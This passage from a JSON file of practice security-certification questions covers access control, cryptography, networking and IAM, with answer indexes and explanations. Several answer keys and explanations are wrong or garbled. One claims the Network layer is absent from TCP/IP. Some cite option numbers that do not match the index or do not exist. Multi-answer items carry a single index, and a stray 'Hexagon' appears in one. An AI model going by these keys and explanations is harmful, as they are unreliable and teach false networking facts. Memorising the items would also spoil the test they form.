      "stem": "You work in a small enterprise where you find that the Senior Management has access to everything including super admin privileges to Applications, Domains, and App/Web Servers. Which option Security Principles is most likely to be violated with this approach?",
      "choices": [
        "Secure Defaults",
        "Need to Know",
        "Least Privilege",
        "Zero Trust"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. The principle of least privilege states that one should only have access to what they need and nothing more. In the above scenario, everyone in the Senior Management Team has access to privileges that they don't need or use in their day-to-day actions. Need to Know refers to the confidentiality of information. You don't reveal the information to anyone who does not need to know about it. For example, People from the HR department do not need to know about the Financial Reporting Application managed by the Finance Department Secure Defaults is the Security Concept which ensures that the default configuration settings of a product are the most secure settings possible. Zero Trust is a security concept centered on the belief that organizations should not automatically trust anything inside or outside their perimeters and instead must verify anything and everything trying to connect to its systems before granting access."
    },
    {
      "id": "d3-q46",
      "domain": "3. Security Architecture and Engineering",
      "stem": "Which option Security Control Models defines Separation of Duties?",
      "choices": [
        "Bell LaPadula",
        "Biba",
        "Clark Wilson",
        "Brewer Nash (Chinese Wall)"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. The Clark-Wilson Model enforces the concept of separation of duties. Clark-Wilson features an access control triple, which is composed of the user, transformational procedure, and the constrained data item, and was designed to protect integrity. Clark-Wilson controls the way in which subjects access objects so that the internal consistency of the system can be ensured and that data can be manipulated only in ways that protect consistency."
    },
    {
      "id": "d3-q47",
      "domain": "3. Security Architecture and Engineering",
      "stem": "During the sales presentation of the Enterprise VPN Solution, the Sales Representative mentions that their product is certified by Evaluation Assurance Level (EAL7) Common Criteria Standards. How does this impact your decision about selecting the product?",
      "choices": [
        "The Common Criteria ensures that the product is appropriate for your organization",
        "The Common Criteria ensures that the product has met Functionality and Assurance requirements",
        "The Common Criteria ensures that the product meets all the functional and non-functional requirements",
        "The Common Criteria ensures that the product is secure irrespective of how users act on it."
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. The Common Criteria ensures that the product has met the Functionality and Assurance Standards of a specific Protection Profile. However, your organization must evaluate whether the Protection Profile matches your organization's requirements. The Common Criteria ensures that the following are true: • Products can be evaluated by competent and independent licensed laboratories so as to determine the fulfillment of particular security properties to a certain extent or assurance • Supporting documents are used within the Common Criteria certification process to define how the criteria and evaluation methods are applied when certifying specific technologies • The certification of the security properties of an evaluated product can be issued by a number of Certificate Authorizing Schemes, with this certification being based on the result of their evaluation"
    },
    {
      "id": "d3-q48",
      "domain": "3. Security Architecture and Engineering",
      "stem": "Your Enterprise has suffered from a severe data breach, what could be the impact of the Security Breach on the Authorization to Operate (ATO) on the Firewall System which was impacted by the Data Breach?",
      "choices": [
        "Authorization Officer must determine the impact and may reissue the ATO",
        "ATO is null and void as the Security of the Firewall is compromised",
        "ATO is no longer necessary as the Security of the Firewall is compromised",
        "No Changes to the ATO as the Data Breach has been identified and the issue has been fixed."
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. The Authorization to Operate (ATO) refers to an official approval to use secured equipment given by the Authorization Officer (AO). NIST defines authorization to operate (ATO) as a \"management decision given by a senior organizational official to authorize the operation of an information system and to explicitly accept the risk to organizational operations (including mission, functions, image, or reputation), organizational assets, individuals, other organizations, and the Nation based on the implementation of an agreed-upon set of security [and privacy] controls.\" A typical ATO is issued for 5 years (although assigned time frames vary and the AO can adjust the time frame even after issuing an ATO) and must be reobtained whenever one of the following conditions occurs: - The ATO time frame has expired. - The system experiences a significant security breach. - The system experiences a significant security change. The AO has the discretion to determine which breaches or security changes result in a loss of ATO."
    },
    {
      "id": "d3-q49",
      "domain": "3. Security Architecture and Engineering",
      "stem": "Windows BitLocker uses which concept to perform Full Disk Encryption using hardware on the motherboard that is used to store Encryption keys?",
      "choices": [
        "Read Only Memory (ROM)",
        "Unified Extensible Firmware Interface (UEFI)",
        "Basic Input/Output System (BIOS)",
        "Trusted Platform Module (TPM)"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. Trusted Platform Module (TPM) technology is designed to provide hardware-based, security-related functions. A TPM chip is a secure crypto-processor that helps you with actions such as generating, storing, and limiting the use of cryptographic keys. Windows BitLocker uses the TPM technology to perform Full Disk Encryption."
    },
    {
      "id": "d3-q50",
      "domain": "3. Security Architecture and Engineering",
      "stem": "The POODLE attack vulnerability was identified in one of your enterprise's Application Servers. The Audit Team has suggested disabling Secure Sockets Layer (SSL) 3.0 with Transport Layer Security (TLS) 1.2. What is the minimum number of keys used during the TLS 1.2 process?",
      "choices": [
        "3",
        "2",
        "5",
        "1"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct., 3. Transport Layer Security (TLS), like the Secure Sockets Layer (SSL), is an encryption protocol intended to keep data secure when being transferred over a network. HTTPS will always negotiate the highest protocol version that is supported by both the client and server in an encrypted conversation. On establishing a connection, the client sends a message to the server with its highest available protocol. If the server supports the same version, it sends a message using that version. This negotiated version is the one that is used for the connection. If the server doesn't support the version presented by the client, the server message will specify the highest version it can use. Therefore, there are at least three keys: 1. Public key: this is known to all parties who can connect to the server and is used to identify the server and as part of the initial key exchange (first half of asymmetric key pair). 2. Private key: this is known only to the server and is used to prove that the server is entitled to represent itself as the subject of the public key (second half of asymmetric key pair) 3. Session key: this is known to both the server and the single client of the connection: a symmetric key negotiated via key exchange and replaced based on cipher suite configuration. Used to encrypt data sent over the TLS connection"
    },
    {
      "id": "d3-q51",
      "domain": "3. Security Architecture and Engineering",
      "stem": "You developed a web scraping script that scrapes data from a website and sends you alerts whenever anything new is added to that site. You want to deploy this script on a cloud-based environment so your script runs non-stop. Which option cloud-based models supports this requirement?",
      "choices": [
        "Infrastructure as a service (IaaS)",
        "Platform as a service (PaaS)",
        "Software as a service (SaaS)",
        "Cloud as a service (CaaS)"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. Function as a service (FaaS), which is a sub-category of Platform as a service (PaaS), is a service-hosted remote procedure call that leverages serverless computing to enable the deployment of individual functions in the cloud that run in response to events. Some examples of FaaS are Heroku, AWS Elastic Beanstalk, Windows Azure, Force.com, Google App Engine, and OpenShift. Option 1 is not correct because Infrastructure as a service is a layer of computing platform that enables clients to outsource IT infrastructures including virtual machines, storage, processing, networking, servers, and other resources on the internet through the model of pay-as-per-use. Option 3 is not correct because Software-as-a-service refers to a model employed in software distribution where a third-party provider acts as the host of applications and avails them to clients over the internet. Option 4 is not correct because Cloud-as-a-service refers to the usage of cloud computing services that are paid for on the basis of pay-per-use."
    },
    {
      "id": "d3-q52",
      "domain": "3. Security Architecture and Engineering",
      "stem": "You are designing the next video streaming service, for which you need to ensure that there is no issue with Content Buffering and that the user gets the best possible viewing experience. Which option architectures will you select?",
      "choices": [
        "Fog Computing",
        "CDN (Content Delivery Network)",
        "Serverless Computing",
        "Virtualized Computing"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. CDN is a Content Delivery Network or Content Distribution Network. As the name suggests, it is a network of servers distributed globally. When you hit the play button, the video displayed on your device is streamed from this component. This significantly reduces the response time as the video is streamed from the server nearest to your location. CDNs replicate content in multiple places, so there's a better chance of videos being closer to the user and with fewer hops. CDN machines make heavy use of caching and can mostly serve videos out of memory. Less popular videos that are not cached by CDNs can be served by the servers in various data centers."
    },
    {
      "id": "d3-q53",
      "domain": "3. Security Architecture and Engineering",
      "stem": "One-time pad is considered to be an unbreakable encryption mechanism with a brute force attack. What is the most likely reason it is not used commercially?",
      "choices": [
        "The key must be at least as long as the plaintext",
        "The key must be random",
        "The key must never be reused in whole or in part",
        "The key must be kept completely secret by the communicating parties."
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. The one-time pad is the only encryption mechanism that is a completely unbreakable cipher. The main disadvantage of encryption with the one-time pad is that it requires a pad of the same length as the plaintext message to be encrypted. Since each pad can only be used once, it is necessary to share a pad of the same length as the message to be shared. This pad must be shared through a completely secure method in order to protect the secrecy of the message. Doing so in real-time is illogical since the existence of a secure method to share the pad means that the message could just be sent using this method."
    },
    {
      "id": "d3-q54",
      "domain": "3. Security Architecture and Engineering",
      "stem": "You are in the Security Management Team of the ABC Corp where you need to design the security standards for the enterprise. Which option algorithms are you most likely to select?",
      "choices": [
        "SHA-1 (Secure Hash Algorithm)",
        "SHA-2 (Secure Hash Algorithm )",
        "MD-5 (Message Digest)",
        "MD-4 (Message Digest)"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. Algorithms like SHA-1, MD4 and MD5 have been proven as broken, so to define the secure algorithm in your organization's security standards you are most likely to select SHA-2 from the options given above."
    },
    {
      "id": "d3-q55",
      "domain": "3. Security Architecture and Engineering",
      "stem": "In your development environment, you mostly use Self-Signed Certificates to test the TLS features of the in-built applications. What is the reason why the usage of Self-Signed Certificates is discouraged?",
      "choices": [
        "Self-Signed Certificates do not have public keys",
        "Self-Signed Certificates cannot be used in TLS",
        "Self-Signed Certificates do not have associated private keys",
        "Self-Signed Certificates are not trusted"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. A Self-Signed Certificate can be generated by anyone which makes them inherently not trusted by your browser because a certificate itself doesn't form any trust. This can only be the case where the certificate is signed by a trusted Certificate Authority."
    },
    {
      "id": "d3-q56",
      "domain": "3. Security Architecture and Engineering",
      "stem": "The Security Guard captures a few new interns tailgating and reports them to Human Resources (HR). What is the best way to prevent such issues from occurring?",
      "choices": [
        "Employee training",
        "Install CCTV",
        "Install fingerprint-based access gates",
        "Use PIN and Card-based access systems"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. Employee training is the best way to ensure that employees follow the security protocols and procedures and especially against common employee practices like tailgating."
    },
    {
      "id": "d4-q40",
      "domain": "4. Communication and Network Security",
      "stem": "The Open System Interconnect (OSI) model defines 7 network layers. However, in the current network infrastructure (TCP/IP Model), some of the layers are either not required or their functions are managed by other layer(s). Which option layers is NOT a part of the application layer in the TCP/IP Model as compared to the described OSI Layers?",
      "choices": [
        "Application",
        "Presentation",
        "Network",
        "Session"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. The Network Layer is not present in the current TCP/IP network model as its functions are provided by the Application Layer. Operations like Data compression, Encryption, and more are handled by the Application Layer."
    },
    {
      "id": "d4-q41",
      "domain": "4. Communication and Network Security",
      "stem": "While analyzing the network packets during encapsulation in the OSI model, you observe that there are a few layers that add trailer in addition to the headers added by the other network layers. Which option OSI layers add trailers to the received payload? Select all anwers that apply.",
      "choices": [
        "Data link",
        "Application",
        "Transport",
        "Network"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "The correct answers are options 4 and 5. In the OSI Model, the Physical and Data Link layers add footers."
    },
    {
      "id": "d4-q42",
      "domain": "4. Communication and Network Security",
      "stem": "Your enterprise wants to adopt IPv6. Given that not all your enterprise's existing network equipment currently supports it, which of the following options is FALSE with respect to the adoption of IPv6 (Internet Protocol)?",
      "choices": [
        "IPv6 uses 128 bits addressing",
        "IPv6 and IPv4 can co-exist on the same network",
        "With IPv6, Domain Name Service (DNS) is no longer required",
        "With IPv6, Network Address Translation (NAT) is no longer required"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. DNS is still required for IPv6. The Domain Name System (DNS) is the phonebook of the Internet. Humans access information online through domain names, like \"nytimes.com\" or \"espn.com\". Web browsers interact through Internet Protocol (IP) addresses. DNS translates domain names to IP addresses so browsers can load Internet resources. IPv6 is the future of the Internet as IPv4 addresses are limited and are not intrinsically secure. IPv6 uses 128-bit addressing (1) instead of the 32-bit addresses in IPv4. IPv6 offers many new features that are not available in IPv4. Some of IPv6's new features are scoped addresses, autoconfiguration, and quality of service (QoS) priority values. IPv6 and IPv4 can coexist on the same network (2) using one or more of three primary options: dual-stack, tunneling, or NAT-PT.With IPv6's autoconfiguration feature, NAT and DHCP are not required (4)."
    },
    {
      "id": "d4-q43",
      "domain": "4. Communication and Network Security",
      "stem": "Network Segmentation is employed in most network architectures, as this provides more security and manageability for network devices and systems. Which option is not a benefit of using Micro-Segmentation?",
      "choices": [
        "Reduced network configurations",
        "Containing network problems",
        "Reduced congestion",
        "Improved Access Control"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. Reduced network configurations are not an advantage of Network Segmentation. Network segmentation in computer networking is the act or practice of splitting a computer network into subnetworks, each being a network segment. The advantages of such splitting are primarily for boosting performance and improving security. The advantages of Network Segmentation are (1) Reduced congestion, which improves performance by reducing the number of hosts per subnetwork and minizes local traffic. Thus, option 3 is incorrect; (2) Improved security, by containing broadcasts to the local network so that the internal network structure is not visible from the outside. By creating network segments containing only the resources specific to the consumers that you authorize access to, you are creating an environment of least privilege; (3) Containing network problems, limiting the effect of local failures on other parts of the network. Thus, option 3 is incorrect; and (4) Improved Access Control, since visitor access to the network can be controlled by implementing VLANs to segregate the network. Option 4 is therefore incorrect."
    },
    {
      "id": "d4-q44",
      "domain": "4. Communication and Network Security",
      "stem": "During a recent network attack, you found out that the existing firewall configuration allowed access to the server (10.1.1.19). Which option firewall rules did not allow for web access to the server?",
      "choices": [
        "DENY IP 10.1.1.19 80 PERMIT IP ANY ANY",
        "PERMIT IP ANY ANY DENY IP 10.1.1.19 21",
        "DENY IP 10.1.1.19 443 PERMIT IP ANY ANY",
        "DENY IP 10.1.1.19 443 DENY IP 10.1.1.19 80 PERMIT IP ANY ANY"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. The Firewall Rules should have explicit DENY rules specified before general Permit rules are listed. Option 4 denies both HTTP and HTTPS access to the server. In all the other options there is a way to access the server via HTTP (3), HTTPS (1). Option 2 allows all the traffic which allows access to the server too."
    },
    {
      "id": "d4-q45",
      "domain": "4. Communication and Network Security",
      "stem": "Your Enterprise has defined clear network segmentation, restricting access from each network zone via firewalls. Which option servers should not be placed on the Demilitarized Zone (DMZ) (Shared Subnet)?",
      "choices": [
        "Web Server",
        "Email Server",
        "Database Server",
        "Domain Name Server (DNS)"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct., database server. DMZs are the best place for your public information. Any servers that serve users via the public internet should reside here. That way customers, potential customers, and outsiders can obtain the information that they need about your company without accessing the internal network. These servers include email (option 2), web (option 1), Domain Name Systems [DNS] (option 4), proxy, and File Transfer Protocol servers. Your confidential and proprietary company information should be stored behind your DMZ on your internal network. Servers on the DMZ shouldn't contain sensitive trade secrets, source code, or proprietary information. Therefore, a server such as a database server should not be placed in a DMZ. This also protects it in case the DMZ is compromised."
    },
    {
      "id": "d4-q46",
      "domain": "4. Communication and Network Security",
      "stem": "Yao's enterprise has recently approved the budget for the Network Access Control Device, please select the features that do not match with the NAC capabilities?",
      "choices": [
        "Detect and Quarantine Malware affected devices",
        "Enforce security policy throughout the network",
        "Prevent/reduce known attacks directly and zero-day indirectly",
        "Use identities to perform access control"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. Network access control is the act of keeping unauthorized users and devices out of a private network. Organizations that give certain devices or users from outside of the organization occasional access to the network can use network access control to ensure that these devices meet corporate security compliance regulations. NAC uses identities to perform access control to Prevent/reduce known attacks directly and zero-day indirectly. It also enforces security policy throughout the network. This is crucial when the enterprise allows for BYOD, Network access for non-Employees, the use of IoT Devices, etc. Detection and Quarantine of Malware affected devices is not a feature of NAC, but instead, of Anti-Malware software."
    },
    {
      "id": "d4-q47",
      "domain": "4. Communication and Network Security",
      "stem": "XYZ Corp recently upgraded their network firewall infrastructure with an Application-Level Firewall. Which option is NOT a common feature of this type of firewall?",
      "choices": [
        "Proxy",
        "Domain Name Server (DNS)",
        "Content Filtering",
        "URL Filtering"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. DNS service is not provided by Application-Level Firewalls. The Domain Name System is the hierarchical and decentralized naming system used to identify computers reachable through the Internet or other Internet Protocol networks. The resource records contained in the DNS associate domain names with other forms of information. Application-level gateway proxy Firewalls operate at the OSI \"application layer\" and make decisions on content. These are very slow in operation but extremely secure as they can even look for keywords in the content. They support a wide array of protocols that reside in the Application layer (Telnet, FTP, SMTP, HTTP, SNMP). Application-level firewalls are more popular than circuit-level gateway proxy firewalls. Generally, these firewalls provide features like Proxy Servers, Content Filtering, and URL Filtering."
    },
    {
      "id": "d4-q48",
      "domain": "4. Communication and Network Security",
      "stem": "You are investigating the authentication mechanisms used in your enterprise, which of the following authentication mechanisms is the least secure?",
      "choices": [
        "Challenge Handshake Authentication Protocol (CHAP)",
        "Extensible Authentication Protocol- Transport Layer Security (EAP-TLS)",
        "Extensible Authentication Protocol- Tunneled Transport Layer Security (EAP-TLS)",
        "Password Authentication Protocol (PAP)"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. Password Authentication Protocol (PAP) provides a means to transport the logon credentials from the client to the authentication server. It transmits usernames and passwords in cleartext. It offers no form of encryption and is the least secure method of authentication. Challenge Handshake Authentication Protocol (CHAP) performs authentication using a challenge-response dialogue that cannot be replayed. A challenge is a random number issued by the server which the client uses along with the password hash to compute the one-way function-derived response. CHAP also periodically reauthenticates the remote system throughout an established communication session to verify the persistent identity of the remote client. This activity is transparent to the user. However, since CHAP is based on MD5, it is no longer considered secure. A Microsoft customization named MS-CHAPv2 uses updated algorithms and is preferred over the original CHAP. Extensible Authentication Protocol (EAP) is a framework for authentication instead of an actual protocol. EAP allows customized authentication security solutions, such as supporting smartcards, tokens, and biometrics. EAP was originally designed for use over physically isolated channels and thus assumed secured pathways. Some EAP methods use encryption, but others do not. Over 40 EAP methods are defined, including LEAP, PEAP, EAP-SIM, EAP-FAST, EAP-MD5, EAP-POTP, EAP-TLS, and EAP-TTLS."
    },
    {
      "id": "d4-q49",
      "domain": "4. Communication and Network Security",
      "stem": "Which option protocols is not commonly used in Virtual Private Networks (VPN)?",
      "choices": [
        "Point-to-Point Protocol (PPP)",
        "Internet Protocol Security (IPSec)",
        "Transport Layer Security (TLS)",
        "Layer 2 Tunneling Protocol (L2TP)"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. PPP is not a protocol used in VPNs. A virtual private network (VPN) is a communication tunnel that provides point-to-point transmission of both authentication and data traffic over an intermediary untrusted network. Most VPNs use encryption to protect the encapsulated traffic, but encryption is not necessary for the connection to be considered a VPN. VPNs are most commonly associated with establishing secure communication paths through the Internet between two distant networks. VPNs can be implemented using software or hardware solutions. In either case, there are several common VPN protocols: PPTP, L2TP, SSH, OpenVPN (i.e., TLS), and IPsec. Point-to-point protocol (PPP) is a layer 2 standard protocol for sending multi-protocol datagrams over point-to-point links such as switches/routers."
    },
    {
      "id": "d4-q50",
      "domain": "4. Communication and Network Security",
      "stem": "Which option attacks is best defended against in the IPv6 (Internet Protocol) network?",
      "choices": [
        "Shoulder Surfing",
        "Sniffing",
        "Phishing",
        "Denial of Service (DoS)"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct., Sniffing. IPSec encrypts the payload and protects the contents of the network transmission. Hence, if a sniffing attack is attempted on IPSec traffic, the intruder will only see the encrypted traffic, not the content."
    },
    {
      "id": "d4-q51",
      "domain": "4. Communication and Network Security",
      "stem": "Your Internet Service Provider (ISP) is reinstalling the physical wires in your area. As a result, large wire bundles and land digs around you. Which option cable types is least resistant to Electro Magnetic Interference (EMI)?",
      "choices": [
        "Fibre Optic Cable",
        "Coaxial Cable",
        "Shielded Twisted Pair (STP) Cable",
        "Unshielded Twisted Pair (UTP) Cable"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. An Unshielded Twisted Pair (UTP) Cable is the least resistant to EMI as it is unshielded. Shielded Twisted Pair has shielding which protects against the EMI. Co-axial cables have insulation around the wire which protects them against EMI. Fibre Optic cables are the most resistant against EMI."
    },
    {
      "id": "d4-q52",
      "domain": "4. Communication and Network Security",
      "stem": "The Research and Development department has its network implemented separately as IPv6. However, the department needs to connect to the rest of the enterprise's network, which is implemented as IPv4. Which option devices will be used between the networks?",
      "choices": [
        "Gateway",
        "Router",
        "Switch",
        "Bridge"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. Gateway is a networking device that connects networks that are using different network protocols. It is a product that enables two dissimilar networks to communicate or interface with each other."
    },
    {
      "id": "d5-q41",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "Every enterprise has multiple critical assets, and each has its own set of admin accounts. Based on the enterprise's Security Policy, each time the shared admin account is used, the password needs to be changed. Which option tools is used to manage such accounts?",
      "choices": [
        "Active Directory Credential Management",
        "Identity Management System",
        "Access Management System",
        "Privileged Access Management System"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. Privileged Access Management (PAM) is an information security (infosec) mechanism that safeguards identities with special access or capabilities beyond regular users. PAM systems treat privileged accounts with extra care because of the risk they pose to the technology environment. For example, should the credentials of an administrator or service account fall into the wrong hands, it could lead to the compromise of the organization's systems and confidential data."
    },
    {
      "id": "d5-q42",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "During a recent Phishing attempt, the attackers successfully accessed one of the systems. As the next step, they plan to gain access to other systems and escalate their privileges. Which option terms best describes this activity?",
      "choices": [
        "Privilege Escalation",
        "Lateral Movement",
        "Privilege Creep",
        "Permission Aggregation"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. Lateral movement refers to the techniques that a cyber-attacker uses after gaining initial access, to move deeper into a network in search of sensitive data and other high-value assets. After entering the network, the attacker maintains ongoing access by moving through the compromised environment and obtaining increased privileges using various tools. Privilege escalation (1) is the act of exploiting a bug, a design flaw, or a configuration oversight in an operating system or software application to gain elevated access to resources that are normally protected from an application or user. Privilege creep (3) is the slow and often unsupervised process of unnecessary privileges and rights being granted to users and identities. These accounts, with privileges greater than may be necessary and documented, pose a grave risk to the enterprise. Permission Aggregation (4) is another term for Privilege creep."
    },
    {
      "id": "d5-q43",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "Device authentication is a core component of a zero-trust architecture and should always be enforced in conjunction with strong user authentication. Which option techniques should not be used to perform Device Authentication? (Select TWO)",
      "choices": [
        "IP Allowlist",
        "Public Key Infrastructure",
        "Cookies",
        "Token-based Authentication"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "The correct answers are options 1 and 3. IP Address Whitelisting would not be a valid technique for Device Authentication as IP addresses are easy to spoof, are not considered a secret, and are not always static. Cookies are likewise ineffective for this. Mostly seen on the web, cookies can be used to store a device's identifiers. The problem is that cookies can be moved from one device to another. Public Key Infrastructure (2) and Token-based authentication (4) would be valid strategies for this."
    },
    {
      "id": "d5-q44",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "The new Access Management system in your enterprise supports Just-in-Time provisioning. Which option is NOT a benefit of JIT?",
      "choices": [
        "Reduced Onboarding Time",
        "Reduced number of accounts",
        "Reduced number of entitlements",
        "Increased Security"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. The number of entitlements is generally independent of the Identity Solution, it is dependent on the end application which is managed by the Identity Solution. JIT provisioning is a method of automating user account creation. It is generally based on an SSO solution, such that, when a new user tries to log in to an authorized app for the first time they trigger the flow of information (that's needed to create their account) from the identity provider to the app. The benefits of JIT are Reduced Onboarding Time (1), Reduced number of Accounts (2), and Increased Security (4)."
    },
    {
      "id": "d5-q45",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "Your enterprise's web application allows the user to log in either directly or via major Social Media Services like Google, Facebook, Twitter, etc. (Social Login). Which option protocols is most likely to be used in this scenario? (Select TWO)",
      "choices": [
        "SAML",
        "Oauth",
        "OpenID Connect",
        "XML"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "The correct answers are options 2 and 3. Social Login is generally implemented via protocols like OAuth 2.0 and OpenID Connect. Social login, also known as social sign-in or social sign-on, uses information from social networking sites to facilitate logins on third-party applications and platforms. The process is designed to simplify sign-in and registration experiences, providing a convenient alternative to mandatory account creation."
    },
    {
      "id": "d5-q46",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "A user has been granted \"Top Secret\" clearance, which is the highest access that anyone can have. What is the best reason why they may not have access to a Top-Secret classified File?",
      "choices": [
        "The Top-Secret classified file requires additional access",
        "Hexagon does not follow Mandatory Access Control",
        "The Top-Secret classified file requires additional classification",
        "They do not have a valid Need to Know"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. They do not have a valid need to know. Mandatory Access Control (MAC) is a means of restricting access to system resources based on the sensitivity (as represented by a label) of the information contained in the system resource and the formal authorization (i.e., clearance) of users to access information of such sensitivity. The most likely reason that the user does not have access to the Top-Secret Classified file is that they do not have a valid Need-to-Know authorization to access the file. The concept of Need-to-Know states that a user shall only have access to the information that their job function requires, regardless of their security clearance level or other approvals."
    },
    {
      "id": "d5-q47",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "An enterprise has implemented Role-Based Access Control, what mechanism should they incorporate so that no one has access to initiate and approve a transaction?",
      "choices": [
        "Least privilege",
        "Separation of Duty",
        "Need to Know",
        "Mandatory Leave"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. Separation of Duty is the principle that no user should be given enough privileges to misuse the system on their own. For example, the person authorizing a paycheck should not also be the one who can prepare them."
    },
    {
      "id": "d5-q48",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "Which option Access Control mechanisms authorizes a user dynamically?",
      "choices": [
        "Mandatory Access Control",
        "Discretionary Access Control",
        "Role-Based Access Control",
        "Attribute-Based Access Control"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. Attribute-Based Access Control (ABAC) authorizes access dynamically based on the characteristics of both Subject and Object. By definition, ABAC is an access control method where subject requests to perform operations on objects are granted or denied based on the assigned attributes of the subject, assigned attributes of the object, environment conditions, and a set of policies that are specified in terms of those attributes and conditions. Other Access control mechanisms do not consider changes in Subject/Object attributes to authorize access."
    },
    {
      "id": "d5-q49",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "A Software Development enterprise has clearly defined user onboarding workflows that give every user base access to the enterprise's infrastructure, along with their specific department access. After onboarding, the user needs to request the required accesses based on their requirement, this needs to be approved. Which Access Control Model is this?",
      "choices": [
        "Role-Based Access Control",
        "Request-Based Access Control",
        "Attribute-Based Access Control",
        "Mandatory Access Control"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. The described scenario is a typical Role-Based Access Control where the users are provided with birthright access along with role-based accesses (department, location, etc). In typical Role-Based Access Control implementations, once provided with the birthright accesses, the user can request for the other roles which go through the approvals before being granted (Request Based Access Control)."
    },
    {
      "id": "d5-q50",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "During Annual Access Review, the Manager finds that consultants previously given temporary accesses still have these accesses. What next step could be taken by the manager?",
      "choices": [
        "Delegate the action to the Manager's Manager",
        "Approve the accesses of the consultants",
        "Revoke the accesses of the consultants",
        "Confirm existing user's need for the access before taking action"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. Before taking any action, the Manager should connect with the team members (existing consultants) to determine whether they still require access or not. Based on the response, the Manager should take the appropriate action on whether to approve or revoke."
    },
    {
      "id": "d5-q51",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "After implementing the Identity Management Solution for their employees, an enterprise now wants to manage Service Accounts via their IAM system. In the Identity Management (IAM) system, the Service Accounts should be associated with which of the managed identities?",
      "choices": [
        "Application Owner's Identity",
        "Separate Identities for Service Account",
        "Service Owner's Identity",
        "Service Administrator's Identity"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. Service Accounts should be assigned to a separate Service Identity rather than any individual's identity. The reason for that is in case any of the individual's identities get terminated, deprovisioned, or transferred. The associated Service accounts need to be reassigned to another identity which will make the Service Account management difficult."
    },
    {
      "id": "d5-q52",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "Business A performed the 3rd party audit for business B and found that several application accounts were still active even though the associated identity had been terminated. What is the best control to handle this situation?",
      "choices": [
        "Closed loop automated application Integration with IAM system",
        "Periodic recertification of access",
        "Automated provisioning/de-provisioning of managed identities",
        "Role-based access control"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
